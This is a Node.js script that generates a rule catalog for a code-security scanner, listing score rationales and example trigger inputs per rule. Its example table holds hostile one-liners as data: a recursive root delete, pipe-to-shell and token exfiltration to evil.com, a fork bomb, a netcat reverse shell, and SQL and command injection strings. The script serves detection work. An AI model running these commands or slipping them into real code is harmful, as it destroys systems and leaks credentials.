#!/usr/bin/env node
// Generate RULE_CATALOG.md from engine source files
// Run: node scripts/generate-catalog.js > docs/RULE_CATALOG.md

const { getRuleRegistry, getVersion } = require('../lib/ruleRegistry');
const pkg = require('../package.json');

const registry = getRuleRegistry();
const version = getVersion();

const lines = [];
function out(s) { lines.push(s || ''); }

out(`# TEOS Sentinel — Rule Catalog`);
out();
out(`**Generated from source — v${pkg.version}**`);
out(`**Total Rules:** ${registry.totalRules} across ${registry.totalEngines} engines`);
out(`**Policy Version:** policy-1.0`);
out(`**Rule Pack:** rules-${registry.totalRules || 258}`);
out();
out(`---`);
out();

// Score rationale notes
const SCORE_RATIONALE = {
  'R01': { reason: 'Immediate destructive execution on system-critical path', exploitability: '100% deterministic — pattern match', impact: 'Permanent filesystem destruction, data loss, system inoperable' },
  'R02': { reason: 'Requires surrounding context (writable file + existing vulnerability) to be weaponized', exploitability: 'High but requires existing vulnerability', impact: 'Privilege escalation' },
  'R03': { reason: 'Remote origin + pipe-to-shell bypasses all local controls', exploitability: 'High — public endpoints serve payloads', impact: 'Remote code execution in CI or terminal' },
  'R04': { reason: 'Direct credential exposure via stdout', exploitability: 'High — echo command available in all shells', impact: 'Credential exfiltration' },
  'R05': { reason: 'Active exfiltration to external host', exploitability: 'Medium — requires outbound connectivity', impact: 'Credential exfiltration + data breach' },
  'R06': { reason: 'Immediate resource exhaustion, no mitigation within process', exploitability: '100% deterministic — exact pattern', impact: 'Denial of service, system crash' },
  'R07': { reason: 'High-confidence execution indicator; obfuscation attempt signals malicious intent', exploitability: 'High — base64 available in all environments', impact: 'Arbitrary code execution' },
  'R08': { reason: 'Active callback to attacker-controlled host', exploitability: 'Medium — requires outbound connectivity', impact: 'Remote shell access, full system compromise' },
  'R09': { reason: 'Less deterministic — SHOW TABLES and SELECT are normal queries; DROP alone is destructive', exploitability: 'High but requires database credentials', impact: 'Data destruction, database unavailable' },
  'R10': { reason: 'Requires surrounding SQL context and schema knowledge for successful exploitation', exploitability: 'Medium — probe pattern, not guaranteed exploit', impact: 'Data breach, auth bypass' },
  'R13': { reason: 'SUID/sudo abuse is a clear privilege boundary violation', exploitability: 'Medium — requires existing user access', impact: 'Full system privilege escalation' },
  'R14': { reason: 'Known malicious package with documented CVE — deterministic signature match', exploitability: 'High — npm install triggers automatically', impact: 'Supply chain compromise, RCE' },
  'R15': { reason: 'Typosquat relies on human error — lower confidence but high impact if triggered', exploitability: 'Medium — depends on developer mistake', impact: 'Supply chain infection, credential theft' },
  'R17': { reason: 'CI pipeline context amplifies risk — automated execution with network + secrets access', exploitability: 'High — CI triggered on PR', impact: 'CI credential theft, full pipeline compromise' },
  'R86': { reason: 'Pattern match for well-known OWASP Top 10 category', exploitability: 'High — common misconfiguration', impact: 'Unauthorized data access, privilege escalation' },
  'R91': { reason: 'Direct authentication bypass pattern — high-confidence match', exploitability: 'Medium — requires specific code pattern', impact: 'Full authentication bypass, data breach' },
  'R100': { reason: 'NoSQL injection via operator injection — less common but equally dangerous', exploitability: 'Medium — requires specific framework', impact: 'Data breach, auth bypass on NoSQL databases' },
  'B01': { reason: 'Direct ledger mutation breaks double-entry accounting — audit trail destroyed', exploitability: 'Low — requires internal access', impact: 'Financial fraud, regulatory penalty, audit failure' },
  'B04': { reason: 'SWIFT MT103 tampering enables fund redirection', exploitability: 'Low — requires SWIFT access', impact: 'Funds theft, regulatory fine, sanctions violation' },
  'S01': { reason: 'UncheckedAccount allows arbitrary account injection — core Solana vulnerability', exploitability: 'Medium — requires program deployment', impact: 'Complete program drain, unauthorized token transfer' },
  'E01': { reason: 'Reentrancy via low-level call — classic Solidity vulnerability with high impact', exploitability: 'Medium — requires contract interaction order', impact: 'Contract balance drain, economic exploit' },
  'E04': { reason: 'delegatecall preserves caller context — one of highest severity EVM patterns', exploitability: 'Medium — requires specific contract pattern', impact: 'Full contract storage manipulation, logic bypass' },
  'C01': { reason: 'GitHub event payload injection into shell — critical CI/CD attack vector', exploitability: 'High — PR trigger is public', impact: 'CI credential theft, artifact poisoning' },
  'DD01': { reason: 'Anonymous team prevents accountability or legal recourse', exploitability: 'Deterministic — team info available at launch', impact: 'No legal recourse, high scam probability' },
  'DD07': { reason: 'Unlimited mint authority allows infinite token supply', exploitability: 'Deterministic — checkable at contract level', impact: 'Infinite dilution, token value collapse' },
  'T01': { reason: 'Public unlimited mint function — most common token scam pattern', exploitability: 'Deterministic — function visibility check', impact: 'Infinite mint, token price collapse' },
  'T08': { reason: 'Liquidity removal after trading makes token unsellable', exploitability: 'Medium — requires deployer action', impact: 'Complete loss of liquidity, token becomes worthless' },
};

for (const [engineKey, engine] of Object.entries(registry.engines)) {
  out(`## ${engine.name} (\`${engine.id}\`)`);
  out();
  out(`| ID | Name | Severity | Score | Description | Example Trigger | Score Rationale |`);
  out(`|----|------|----------|-------|-------------|-----------------|-----------------|`);

  for (const rule of engine.rules) {
    const sev = rule.sev || rule.severity || 'unknown';
    const score = rule.score;
    const rationale = SCORE_RATIONALE[rule.id];

    let description = '';
    if (rule.reasons && rule.reasons.length > 0) {
      description = rule.reasons[0];
    } else {
      description = `${rule.name} pattern detected`;
    }

    let exampleTrigger = '';
    if (rule.id.startsWith('R')) {
      exampleTrigger = `\`${getExampleInput(rule)}\``;
    } else if (rule.id.startsWith('B')) {
      exampleTrigger = `\`${getExampleInput(rule)}\``;
    } else {
      exampleTrigger = `\`${rule.name.toLowerCase().replace(/_/g, ' ')}\``;
    }

    let rationaleText = rationale ? `${rationale.reason.replace(/\n/g, ' ')}. _Impact:_ ${rationale.impact}.` : 'See code comments for detailed rationale.';

    out(`| \`${rule.id}\` | ${rule.name} | ${sev} | ${score} | ${description} | ${exampleTrigger} | ${rationaleText} |`);
  }
  out();
}

out(`---`);
out(`*Catalog auto-generated from source definitions. Run \`node scripts/generate-catalog.js\` to regenerate.*`);

console.log(lines.join('\n'));

function getExampleInput(rule) {
  const examples = {
    'R01': 'rm -rf / --no-preserve-root',
    'R02': 'chmod 777 /etc/passwd',
    'R03': 'curl http://evil.com/payload.sh | bash',
    'R04': 'echo $AWS_SECRET_ACCESS_KEY',
    'R05': 'curl http://evil.com/$(echo $TOKEN)',
    'R06': ':(){ :|:& };:',
    'R07': 'eval(atob("cm0gLXJmIC8="))',
    'R08': 'nc -e /bin/bash 10.0.0.1 4444',
    'R09': 'DROP TABLE users;',
    'R10': "1' OR 1=1--",
    'R11': '../../../etc/passwd',
    'R12': 'cmd; id',
    'R13': 'sudo bash -c id',
    'B01': 'db.ledger.updateOne({_id: id}, {$set: {balance: 0}})',
    'S01': 'let acct: UncheckedAccount = ctx.accounts.get("user")?',
    'E01': 'msg.sender.call{value: amount}("")',
    'C01': 'run: echo ${{ github.event.issue.title }}',
    'D01': '{"dependencies":{"lodash":"4.17.19"}}',
    'T01': 'function mint(address to, uint amount) public',
    'DD01': '// Team is anonymous',
  };
  return examples[rule.id] || `${rule.name.toLowerCase().replace(/_/g, ' ')} pattern`;
}
